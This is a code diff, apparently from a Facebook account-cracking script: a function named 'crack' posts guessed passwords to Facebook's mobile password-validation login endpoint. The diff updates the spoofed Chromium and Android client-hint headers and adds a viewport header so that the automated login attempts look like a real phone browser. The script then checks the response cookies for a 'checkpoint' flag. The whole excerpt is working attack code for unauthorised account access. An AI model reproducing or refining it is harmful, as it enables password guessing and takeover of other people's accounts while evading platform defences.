@@ -650,18 +650,19 @@ def crack(idf,pwv):
     'referer': 'https://m.facebook.com/',
     'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
+    'viewport-width': '980',
 }
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
